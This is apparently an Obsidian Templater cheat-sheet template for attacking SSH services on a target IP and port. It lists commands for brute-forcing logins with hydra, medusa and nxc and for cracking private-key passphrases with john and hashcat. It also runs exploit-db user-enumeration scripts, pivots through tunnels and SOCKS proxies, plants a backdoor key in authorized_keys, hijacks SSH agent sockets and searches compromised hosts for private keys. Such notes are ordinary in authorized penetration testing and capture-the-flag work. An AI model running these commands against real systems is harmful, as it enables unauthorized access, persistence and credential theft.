# SSH — Port <% tp.frontmatter.current_port %>
<%* let ip = tp.frontmatter.target_ip; let port = tp.frontmatter.current_port || 22 -%>

---

## Banner / Version Grab
```bash
nc -nv <% ip %> <% port %>
```

```bash
ssh -v <% ip %> -p <% port %> 2>&1 | head -30
```

```bash
nmap -p<% port %> --script=ssh-hostkey,ssh2-enum-algos,ssh-auth-methods <% ip %>
```

---

## Connect — Standard
```bash
ssh <% tp.frontmatter.username || 'USER' %>@<% ip %> -p <% port %>
```

```bash
# With password (sshpass)
sshpass -p '<% tp.frontmatter.password || 'PASSWORD' %>' ssh <% tp.frontmatter.username || 'USER' %>@<% ip %> -p <% port %>
```

---

## Connect — Private Key
```bash
ssh -i id_rsa <user>@<% ip %> -p <% port %>
```

```bash
chmod 600 id_rsa && ssh -i id_rsa <user>@<% ip %> -p <% port %>
```

---

## Key Attacks
```bash
# Crack encrypted private key
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 22931 id_rsa.hash /usr/share/wordlists/rockyou.txt
```

```bash
# Check for weak DSA/RSA keys (Debian predictable prng)
python3 /usr/share/exploitdb/exploits/linux/remote/5622.py
```

---

## User Enumeration (OpenSSH < 7.7)
```bash
python3 /usr/share/exploitdb/exploits/linux/remote/45233.py <% ip %> <% port %> <user>
```

```bash
msf: use auxiliary/scanner/ssh/ssh_enumusers
```

---

## Brute Force
```bash
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<% ip %> -s <% port %> -t 4 -V
```

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt ssh://<% ip %> -s <% port %> -t 4
```

```bash
nxc ssh <% ip %> -u users.txt -p passwords.txt
```

```bash
medusa -h <% ip %> -u <user> -P /usr/share/wordlists/rockyou.txt -M ssh -n <% port %>
```

---

## SSH Tunneling / Port Forwarding

### Local Port Forward (access remote service locally)
```bash
# Access remote 127.0.0.1:PORT through SSH tunnel on local 1234
ssh -L 1234:127.0.0.1:<remote_port> <user>@<% ip %> -p <% port %> -N
```

### Remote Port Forward (expose local service to remote)
```bash
ssh -R <remote_port>:127.0.0.1:<local_port> <user>@<% ip %> -p <% port %> -N
```

### Dynamic SOCKS Proxy
```bash
ssh -D 1080 <user>@<% ip %> -p <% port %> -N -f
# Then: proxychains4 nmap -sT <internal_host>
```

### Jump Host / ProxyJump
```bash
ssh -J <user>@<% ip %>:<% port %> <user2>@<internal_host>
```

---

## Old / Weak Algorithm Negotiation Errors

```bash
# "no matching key exchange method" — add legacy KEX
ssh <user>@<% ip %> -p <% port %> -oKexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1
```

```bash
# "no matching cipher" — add legacy cipher
ssh <user>@<% ip %> -p <% port %> -oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes128-cbc
```

```bash
# "no matching host key type" — add legacy host key
ssh <user>@<% ip %> -p <% port %> -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa
```

---

## Authorized Keys Backdoor
```bash
# If you have write to ~/.ssh/authorized_keys
ssh-keygen -t rsa -b 4096 -f backdoor -N ""
echo $(cat backdoor.pub) >> /home/<user>/.ssh/authorized_keys
ssh -i backdoor <user>@<% ip %> -p <% port %>
```

---

## SSH Agent Hijacking
```bash
# If SSH_AUTH_SOCK is set and you have file access
ls /tmp/ssh-*/
SSH_AUTH_SOCK=/tmp/ssh-<socket> ssh-add -l
SSH_AUTH_SOCK=/tmp/ssh-<socket> ssh <user>@<other_host>
```

---

## Config File Locations
```
/etc/ssh/sshd_config           — server config (look for PasswordAuthentication, PermitRootLogin)
~/.ssh/authorized_keys         — allowed public keys
~/.ssh/known_hosts             — previously connected hosts
~/.ssh/id_rsa                  — private key (look for on compromised hosts)
/etc/ssh/ssh_host_rsa_key      — server host private key
```

---

## Notes
